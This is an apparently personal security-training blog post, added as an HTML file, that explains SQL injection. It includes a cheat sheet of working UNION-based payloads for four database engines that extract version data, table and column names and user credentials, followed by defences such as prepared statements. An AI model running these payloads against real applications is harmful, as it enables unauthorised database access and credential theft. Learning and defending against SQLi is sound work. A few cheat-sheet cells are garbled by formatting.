@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DB Snake: How SQL injection works and what to do</title>
+  <link rel="stylesheet" href="../css/style.css" />
+</head>
+<body>
+  <header>
+    <h1><a href="../index.html">← Back to Start</a></h1>
+  </header>
+
+  <article class="blog-post">
+    <h2>DB Snake: How SQL injection works and what to do</h2>
+    <p class="date">February 24, 2026</p>
+
+    <img src="../images/betrayal.png" style="max-width: 100%; border-radius: 8px;" height="200px"/>
+
+    <p>This week I&#39;ve been learning and experimenting with SQL injection (SQLi). An all too common vulnerability that allows attackers to make database queries and extract sensitive information quickly and efficiently, compromising everything from analytics to user credentials and personal information (a.k.a. GDPR nightmare). I will explain how SQLi injection works in theory, share a cheat sheet with working payloads you can try out (with permission of course) and discuss how to protect against SQLi.</p>
+<h1 id="how-sql-injection-works">How SQL Injection works</h1>
+<p>SQLi exploits unsafe programming where a user input is directly parsed into an SQL query in the backend. By escaping the input field arbitrary SQL queries can be injection to obtain sensitive information.</p>
+<p>An example of an unsafe query would be something like this:
+<code>SELECT * FROM products where category = &#39;USER_INPUT&#39;</code></p>
+<p>If user puts in <code>kitchen</code> as a category on the website the backend would query:
+<code>SELECT name, price FROM products where category = &#39;kitchen&#39;</code></p>
+<p>If the input is vulnerable to SQL injection an attacker can instead input <code>kitchen&#39;UNION+SELECT+username,password+FROM+users--</code></p>
+<p>This works because it forms a valid SQL query like this:
+<code>SELECT name, price FROM products where category = &#39;kitchen&#39; UNION SELECT username, password FROM users--</code> (spaces have been added for clarity). The result will be a set of data that contains both the products from the kitchen category but additionally has the columns username and password from the users table appended.</p>
+<p>The attacker has successfully performed an SQL injection attack and has compromised user credentials.</p>
+<h1 id="types-of-sqli">Types of SQLi</h1>
+<p>The example shown above was a UNION based attack but their are 3 other important types of SQLi commonly used:</p>
+<h2 id="error-based">Error Based</h2>
+<p>Sometimes the web service returns the database error message when SQLi is performed. This helps to identify the backend query and therefore form better SQL injection payloads.</p>
+<h2 id="union-based">Union Based</h2>
+<p>By using the <code>UNION</code> command we can aggregate the results of two <code>SELECT</code> queries into a single result. This can be used to append a malicious query appending the extracted information to the real result.</p>
+<blockquote>
+<p>[!NOTE] Column number
+UNION based attacks require the malicious payload to return the same number of columns as the legit query. To find out how many columns are returned we can use context or use <code>&#39;ORDER BY x--</code> incrementing x by one each time until an error is encountered. If an error is encountered at x=4 we know that there are 3 columns.</p>
+<h2 id="blind-boolean-based">Blind // Boolean Based</h2>
+<p>Can be tested with something like <code>&#39; AND 1=1--</code>. This allows us to obtain database information using true or false conditions similar to time based attacks. For example finding the length of database with a query like this <code>&#39; AND (length(database())) = 1 --</code> can check if the database length is 1. Similar to time based attacks this is very slow because no actual data is returned, but it can be used to verify results.</p>
+</blockquote>
+<h2 id="blind-time-based">Blind // Time Based</h2>
+<p>By forcing the database to wait before returning the value with <code>SLEEP(10)</code> we can figure out if the query result is TRUE or FALSE. Depending on the outcome, the response will either be delayed or returned immediately. No real data is returned, it can only be confirmed bit by bit if the result is True of False making attacks like these slow, especially with large databases.</p>
+<h1 id="cheat-sheet">Cheat sheet</h1>
+<h2 id="1-get-version-information">1. Get version information</h2>
+<table>
+<thead>
+<tr>
+<th>Oracle</th>
+<th><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Microsoft</td>
+<td><code>SELECT @@version</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SELECT version()</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SELECT @@version</code></td>
+</tr>
+</tbody>
+</table>
+<p>(assuming UNION expects two columns)
+Oracle
+<code>&#39;UNION+SELECT+NULL,banner+FROM+v$version--</code>
+Microsoft
+<code>&#39;UNION+SELECT+NULL,@@version--</code>
+PostgreSQL
+<code>&#39;UNION+SELECT+NULL,version()--</code>
+MySQL
+<code>&#39;UNION+SELECT+NULL,@@version-- c</code></p>
+<h2 id="2-get-tables">2. Get Tables</h2>
+<table>
+<thead>
+<tr>
+<th>Oracle</th>
+<th><code>SELECT * FROM all_tables</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Microsoft</td>
+<td><code>SELECT * FROM information_schema.tables</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SELECT * FROM information_schema.tables</code><br></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SELECT * FROM information_schema.tables</code></td>
+</tr>
+</tbody>
+</table>
+<p>(assuming UNION expects two columns)
+Oracle
+<code>&#39;UNION+SELECT+NULL,table_name+FROM+all_tables--</code>
+Microsoft
+<code>&#39;UNION+SELECT+NULL,table_name+FROM+information_schema.tables--</code>
+PostgreSQL
+<code>&#39;UNION+SELECT+NULL,table_name+FROM+information_schema.tables--</code>
+MySQL
+<code>`&#39;UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- c</code></p>
+<h2 id="3-get-columns">3. Get columns</h2>
+<table>
+<thead>
+<tr>
+<th>Oracle</th>
+<th><code>SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Microsoft</td>
+<td><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
+</tr>
+</tbody>
+</table>
+<p>(assuming UNION expects two columns)
+Oracle
+<code>&#39;UNION+SELECT+NULL,all_tab_columns+WHERE+table_name=&#39;TABLE_NAME&#39;--</code></p>
+<p>Microsoft<code>&#39;UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name=&#39;TABLE_NAME&#39;--</code></p>
+<p>PostgreSQL<code>&#39;UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name=&#39;TABLE_NAME&#39;--</code></p>
+<p>MySQL<code>&#39;UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name=&#39;TABLE_NAME&#39;-- c</code></p>
+<h2 id="string-concatenation">String concatenation</h2>
+<table>
+<thead>
+<tr>
+<th>Oracle</th>
+<th>`&#39;foo&#39;\</th>
+<th>&#39;bar&#39;`</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Microsoft</td>
+<td><code>&#39;foo&#39;+&#39;bar&#39;</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>`&#39;foo&#39;\</td>
+<td>&#39;bar&#39;`</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>&#39;foo&#39; &#39;bar&#39;</code> <br><code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="column-concatenation">Column concatenation</h2>
+<p><code>|| &#39;~&#39; ||</code>
+for example <code>username || &#39;~&#39; || password</code> will retrieve username and password as one column with the value seperated by a ~.</p>
+<h2 id="substring">Substring</h2>
+<table>
+<thead>
+<tr>
+<th>Oracle</th>
+<th><code>SUBSTR(&#39;foobar&#39;, 4, 2)</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Microsoft</td>
+<td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td>
+</tr>
+</tbody>
+</table>
+<h1 id="comments">Comments</h1>
+<table>
+<thead>
+<tr>
+<th>Oracle</th>
+<th><code>--comment</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Microsoft</td>
+<td><code>--comment</code><br><code>/*comment*/</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>--comment</code><br><code>/*comment*/</code><br><code>#comment</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>-- comment</code><br><code>/*comment*/</code></td>
+</tr>
+</tbody>
+</table>
+<h1 id="how-to-protect-against-sqli">How to protect against SQLi</h1>
+<h2 id="prepared-statements">Prepared statements</h2>
+<p>The easiest and one of the safest solutions are prepared statements. Instead of directly inserting data into SQL queries we use a placeholder <code>?</code>. On execution the application binds the values to the parameters.</p>
+<h2 id="sanitation">Sanitation</h2>
+<p>Additionally, it is recommended to sanitise data and remove special characters (if not necessarily required) from the value, especially <code>&#39;</code>, <code>,</code> and <code>-</code>. Work on a zero-trust basis. Every character that doesn&#39;t need to be supported should be removed.</p>
+<h2 id="encrypt-hash-information">Encrypt / Hash information</h2>
+<p>Although this won&#39;t prevent SQLi injection, encrypting or hashing your database information makes it harder for attackers to use the extracted information. Instead of valid admin credentials or actual credit card information they&#39;ll be left with unidentifiable gibberish.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>Although SQLi is one of the most well known web vulnerabilities, millions of services are still exploitable. As part of the OWASP framework it is incredibly important for system administrators to secure their services. I&#39;ve you&#39;ve had any value from this I&#39;d really appreciate a star on my <a href="https://github.com/engag1ng/pentest-training/">pentest-training repository</a>, which this write-up is part of.</p>
+<p>Thank you to PortSwigger for providing amazing learning resources, cheat sheets and labs to learn from and experiment with.</p>
+    
+  </article>
+
+  <footer>
+    <p>© 2025 engag1ng</p>
+  </footer>
+</body>
+</html>
